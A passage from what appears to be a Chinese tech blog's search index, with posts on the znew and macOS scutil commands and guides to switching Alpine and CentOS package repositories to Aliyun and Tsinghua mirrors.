当“.Z”文件比“.gz”文件小时，保留“.Z”文件。\n```\n\n###  参数\n\n文件：指定compress指令压缩生成的“.Z”压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","znew"]},{"title":"【macOS 命令】scutil","url":"/macos-command/scutil/","content":"\n管理系统配置参数。\n\n## 用法\n\n对系统的用户名和主机名进行修改\n\n- ComputerName 就是电脑名称，给人看的（在下图中，电脑名称）\n- HostName 主机名，但通常不会设置这个值\n- LocalHostName 主机名，和 Linux 系统的 hostname 一样（在下图中，本地网络中电脑名称）\n\n<!-- more -->\n\n![电脑名称、主机名设置](https://up-img.yonghong.tech/pic/2021/03/29-20-27-%E6%88%AA%E5%B1%8F2021-03-29%20%E4%B8%8B%E5%8D%888.27.22-EnugWj.png)\n\nhostname 命令取值的顺序：\n\n- hostname 命令设置的值\n- HostName 属性值\n- LocalHostName 属性值（通常系统都会设置此属性）\n\n```shell\n# 查看系统主机名\n$ scutil --get ComputerName\n$ scutil --get HostName\n$ scutil --get LocalHostName\n# 修改系统主机名\n$ scutil --set ComputerName xxx\n$ scutil --set HostName xxx\n$ scutil --set LocalHostName xxx\n```\n\n查看 DNS 配置信息\n\n```shell\n$ scutil --dns\n```\n\n查看代理信息\n\n```shell\n$ scutil --proxy\n```\n\n查看网络信息（ipv4/ipv6）\n\n```shell\n$ scutil --nwi\n```\n\n\n\n\n\n","categories":["macOS 命令"],"tags":["macOS 命令"]},{"title":"【国内镜像】Alpine 3.10 阿里云镜像","url":"/mirror/alpine-3-10-aliyun-mirror/","content":"\nAlpine Linux是一个由社区开发的Linux操作系统，该操作系统以安全为理念，面向x86路由器、防火墙、虚拟专用网、IP电话盒及服务器而设计。\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based on musl libc and busybox.\n\n## 替换镜像源\n\n使用sed命令替换\n\n```shell\nsed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories\n```\n\n<!-- more -->\n\n或者使用下面文本替换\n\n```txt /etc/apk/repositories\nhttp://mirrors.aliyun.com/alpine/v3.10/main\nhttp://mirrors.aliyun.com/alpine/v3.10/community\n```\n\n## 恢复\n\n```txt /etc/apk/repositories\nhttp://dl-cdn.alpinelinux.org/alpine/v3.10/main\nhttp://dl-cdn.alpinelinux.org/alpine/v3.10/community\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/alpine\n- https://mirrors.tuna.tsinghua.edu.cn/help/alpine/\n- [【国内镜像】Alpine 3.10 阿里云镜像](/mirror/alpine-3-10-aliyun-mirror/)\n- [【国内镜像】Alpine 3.11 阿里云镜像](/mirror/alpine-3-11-aliyun-mirror/)\n- [【国内镜像】Alpine 3.12 阿里云镜像](/mirror/alpine-3-12-aliyun-mirror/)\n- [【国内镜像】Alpine 3.10 清华镜像](/mirror/alpine-3-10-tuna-mirror/)\n- [【国内镜像】Alpine 3.11 清华镜像](/mirror/alpine-3-11-tuna-mirror/)\n- [【国内镜像】Alpine 3.12 清华镜像](/mirror/alpine-3-12-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Alpine"]},{"title":"【国内镜像】Alpine 3.10 清华镜像","url":"/mirror/alpine-3-10-tuna-mirror/","content":"\nAlpine Linux是一个由社区开发的Linux操作系统，该操作系统以安全为理念，面向x86路由器、防火墙、虚拟专用网、IP电话盒及服务器而设计。\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based on musl libc and busybox.\n\n## 替换镜像源\n\n使用sed命令替换\n\n```shell\nsed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories\n```\n\n<!-- more -->\n\n或者使用下面文本替换\n\n```txt /etc/apk/repositories\nhttp://mirrors.tuna.tsinghua.edu.cn/alpine/v3.10/main\nhttp://mirrors.tuna.tsinghua.edu.cn/alpine/v3.10/community\n```\n\n## 恢复\n\n```txt /etc/apk/repositories\nhttp://dl-cdn.alpinelinux.org/alpine/v3.10/main\nhttp://dl-cdn.alpinelinux.org/alpine/v3.10/community\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/alpine\n- https://mirrors.tuna.tsinghua.edu.cn/help/alpine/\n- [【国内镜像】Alpine 3.10 阿里云镜像](/mirror/alpine-3-10-aliyun-mirror/)\n- [【国内镜像】Alpine 3.11 阿里云镜像](/mirror/alpine-3-11-aliyun-mirror/)\n- [【国内镜像】Alpine 3.12 阿里云镜像](/mirror/alpine-3-12-aliyun-mirror/)\n- [【国内镜像】Alpine 3.10 清华镜像](/mirror/alpine-3-10-tuna-mirror/)\n- [【国内镜像】Alpine 3.11 清华镜像](/mirror/alpine-3-11-tuna-mirror/)\n- [【国内镜像】Alpine 3.12 清华镜像](/mirror/alpine-3-12-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","Alpine","tuna","清华","清华镜像","清华源"]},{"title":"【国内镜像】Alpine 3.11 阿里云镜像","url":"/mirror/alpine-3-11-aliyun-mirror/","content":"\nAlpine Linux是一个由社区开发的Linux操作系统，该操作系统以安全为理念，面向x86路由器、防火墙、虚拟专用网、IP电话盒及服务器而设计。\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based on musl libc and busybox.\n\n## 替换镜像源\n\n使用sed命令替换\n\n```shell\nsed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories\n```\n\n<!-- more -->\n\n或者使用下面文本替换\n\n```txt /etc/apk/repositories\nhttp://mirrors.aliyun.com/alpine/v3.11/main\nhttp://mirrors.aliyun.com/alpine/v3.11/community\n```\n\n## 恢复\n\n```txt /etc/apk/repositories\nhttp://dl-cdn.alpinelinux.org/alpine/v3.11/main\nhttp://dl-cdn.alpinelinux.org/alpine/v3.11/community\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/alpine\n- https://mirrors.tuna.tsinghua.edu.cn/help/alpine/\n- [【国内镜像】Alpine 3.10 阿里云镜像](/mirror/alpine-3-10-aliyun-mirror/)\n- [【国内镜像】Alpine 3.11 阿里云镜像](/mirror/alpine-3-11-aliyun-mirror/)\n- [【国内镜像】Alpine 3.12 阿里云镜像](/mirror/alpine-3-12-aliyun-mirror/)\n- [【国内镜像】Alpine 3.10 清华镜像](/mirror/alpine-3-10-tuna-mirror/)\n- [【国内镜像】Alpine 3.11 清华镜像](/mirror/alpine-3-11-tuna-mirror/)\n- [【国内镜像】Alpine 3.12 清华镜像](/mirror/alpine-3-12-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Alpine"]},{"title":"【国内镜像】Alpine 3.11 清华镜像","url":"/mirror/alpine-3-11-tuna-mirror/","content":"\nAlpine Linux是一个由社区开发的Linux操作系统，该操作系统以安全为理念，面向x86路由器、防火墙、虚拟专用网、IP电话盒及服务器而设计。\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based on musl libc and busybox.\n\n## 替换镜像源\n\n使用sed命令替换\n\n```shell\nsed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories\n```\n\n<!-- more -->\n\n或者使用下面文本替换\n\n```txt /etc/apk/repositories\nhttp://mirrors.tuna.tsinghua.edu.cn/alpine/v3.11/main\nhttp://mirrors.tuna.tsinghua.edu.cn/alpine/v3.11/community\n```\n\n## 恢复\n\n```txt /etc/apk/repositories\nhttp://dl-cdn.alpinelinux.org/alpine/v3.11/main\nhttp://dl-cdn.alpinelinux.org/alpine/v3.11/community\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/alpine\n- https://mirrors.tuna.tsinghua.edu.cn/help/alpine/\n- [【国内镜像】Alpine 3.10 阿里云镜像](/mirror/alpine-3-10-aliyun-mirror/)\n- [【国内镜像】Alpine 3.11 阿里云镜像](/mirror/alpine-3-11-aliyun-mirror/)\n- [【国内镜像】Alpine 3.12 阿里云镜像](/mirror/alpine-3-12-aliyun-mirror/)\n- [【国内镜像】Alpine 3.10 清华镜像](/mirror/alpine-3-10-tuna-mirror/)\n- [【国内镜像】Alpine 3.11 清华镜像](/mirror/alpine-3-11-tuna-mirror/)\n- [【国内镜像】Alpine 3.12 清华镜像](/mirror/alpine-3-12-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","Alpine","tuna","清华","清华镜像","清华源"]},{"title":"【国内镜像】Alpine 3.12 阿里云镜像","url":"/mirror/alpine-3-12-aliyun-mirror/","content":"\nAlpine Linux是一个由社区开发的Linux操作系统，该操作系统以安全为理念，面向x86路由器、防火墙、虚拟专用网、IP电话盒及服务器而设计。\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based on musl libc and busybox.\n\n## 替换镜像源\n\n使用sed命令替换\n\n```shell\nsed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories\n```\n\n<!-- more -->\n\n或者使用下面文本替换\n\n```txt /etc/apk/repositories\nhttp://mirrors.aliyun.com/alpine/v3.12/main\nhttp://mirrors.aliyun.com/alpine/v3.12/community\n```\n\n## 恢复\n\n```txt /etc/apk/repositories\nhttp://dl-cdn.alpinelinux.org/alpine/v3.12/main\nhttp://dl-cdn.alpinelinux.org/alpine/v3.12/community\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/alpine\n- https://mirrors.tuna.tsinghua.edu.cn/help/alpine/\n- [【国内镜像】Alpine 3.10 阿里云镜像](/mirror/alpine-3-10-aliyun-mirror/)\n- [【国内镜像】Alpine 3.11 阿里云镜像](/mirror/alpine-3-11-aliyun-mirror/)\n- [【国内镜像】Alpine 3.12 阿里云镜像](/mirror/alpine-3-12-aliyun-mirror/)\n- [【国内镜像】Alpine 3.10 清华镜像](/mirror/alpine-3-10-tuna-mirror/)\n- [【国内镜像】Alpine 3.11 清华镜像](/mirror/alpine-3-11-tuna-mirror/)\n- [【国内镜像】Alpine 3.12 清华镜像](/mirror/alpine-3-12-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Alpine"]},{"title":"【国内镜像】Alpine 3.12 清华镜像","url":"/mirror/alpine-3-12-tuna-mirror/","content":"\nAlpine Linux是一个由社区开发的Linux操作系统，该操作系统以安全为理念，面向x86路由器、防火墙、虚拟专用网、IP电话盒及服务器而设计。\n\nAlpine Linux is a security-oriented, lightweight Linux distribution based on musl libc and busybox.\n\n## 替换镜像源\n\n使用sed命令替换\n\n```shell\nsed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories\n```\n\n<!-- more -->\n\n或者使用下面文本替换\n\n```txt /etc/apk/repositories\nhttp://mirrors.tuna.tsinghua.edu.cn/alpine/v3.12/main\nhttp://mirrors.tuna.tsinghua.edu.cn/alpine/v3.12/community\n```\n\n## 恢复\n\n```txt /etc/apk/repositories\nhttp://dl-cdn.alpinelinux.org/alpine/v3.12/main\nhttp://dl-cdn.alpinelinux.org/alpine/v3.12/community\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/alpine\n- https://mirrors.tuna.tsinghua.edu.cn/help/alpine/\n- [【国内镜像】Alpine 3.10 阿里云镜像](/mirror/alpine-3-10-aliyun-mirror/)\n- [【国内镜像】Alpine 3.11 阿里云镜像](/mirror/alpine-3-11-aliyun-mirror/)\n- [【国内镜像】Alpine 3.12 阿里云镜像](/mirror/alpine-3-12-aliyun-mirror/)\n- [【国内镜像】Alpine 3.10 清华镜像](/mirror/alpine-3-10-tuna-mirror/)\n- [【国内镜像】Alpine 3.11 清华镜像](/mirror/alpine-3-11-tuna-mirror/)\n- [【国内镜像】Alpine 3.12 清华镜像](/mirror/alpine-3-12-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","Alpine","tuna","清华","清华镜像","清华源"]},{"title":"【国内镜像】CentOS 6 阿里云镜像","url":"/mirror/centos-6-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\n## 替换镜像源\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/os/$basearch/\ngpgcheck=1\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/updates/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/updates/$basearch/\ngpgcheck=1\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/\ngpgcheck=1\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6\n\n#contrib - packages by Centos Users\n[contrib]\nname=CentOS-$releasever - Contrib - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/contrib/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/contrib/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6\n```\n\n<!-- more -->\n\n非阿里云ECS用户会出现 Couldn't resolve host 'mirrors.cloud.aliyuncs.com' 信息，不影响使用。用户也可自行修改相关配置: eg:\n\n```shell\nsed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo\n```\n\n## 恢复\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#contrib - packages by Centos Users\n[contrib]\nname=CentOS-$releasever - Contrib\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=contrib&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/contrib/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS"]},{"title":"【国内镜像】CentOS 6 epel 阿里云镜像","url":"/mirror/centos-6-epel-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nEPEL(Extra Packages for Enterprise Linux)是由Fedora Special Interest Group维护的Enterprise Linux（RHEL、CentOS）中经 常用到的包。\n\n## 添加epel源\n\n```txt /etc/yum.repos.d/epel.repo\n[epel]\nname=Extra Packages for Enterprise Linux 6 - $basearch\nbaseurl=http://mirrors.aliyun.com/epel/6/$basearch\nfailovermethod=priority\nenabled=1\ngpgcheck=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux 6 - $basearch - Debug\nbaseurl=http://mirrors.aliyun.com/epel/6/$basearch/debug\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\ngpgcheck=0\n\n[epel-source]\nname=Extra Packages for Enterprise Linux 6 - $basearch - Source\nbaseurl=http://mirrors.aliyun.com/epel/6/SRPMS\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\ngpgcheck=0\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS","epel"]},{"title":"【国内镜像】CentOS 6 epel 清华镜像","url":"/mirror/centos-6-epel-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nEPEL(Extra Packages for Enterprise Linux)是由Fedora Special Interest Group维护的Enterprise Linux（RHEL、CentOS）中经 常用到的包。\n\n## 添加epel源\n\n```txt /etc/yum.repos.d/epel.repo\n[epel]\nname=Extra Packages for Enterprise Linux 6 - $basearch\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/6/$basearch\nfailovermethod=priority\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux 6 - $basearch - Debug\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/6/$basearch/debug\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\ngpgcheck=1\n\n[epel-source]\nname=Extra Packages for Enterprise Linux 6 - $basearch - Source\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/6/SRPMS\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\ngpgcheck=1\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS","epel"]},{"title":"【国内镜像】CentOS 6 ius 阿里云镜像","url":"/mirror/centos-6-ius-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nIUS（Inline with Upstream Stable）是一个社区项目，它旨在为 Linux 企业发行版提供可选软件的最新版 RPM 软件包。\n\n## 添加ius源\n\n```txt /etc/yum.repos.d/ius.repo\n[ius]\nname = IUS for Enterprise Linux 6 - $basearch\nbaseurl = https://mirrors.aliyun.com/ius/6/$basearch/\nenabled = 1\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.aliyun.com/ius/RPM-GPG-KEY-IUS-6\n\n[ius-debuginfo]\nname = IUS for Enterprise Linux 6 - $basearch - Debug\nbaseurl = https://mirrors.aliyun.com/ius/6/$basearch/debug/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.aliyun.com/ius/RPM-GPG-KEY-IUS-6\n\n[ius-source]\nname = IUS for Enterprise Linux 6 - Source\nbaseurl = https://mirrors.aliyun.com/ius/6/src/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.aliyun.com/ius/RPM-GPG-KEY-IUS-6\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- 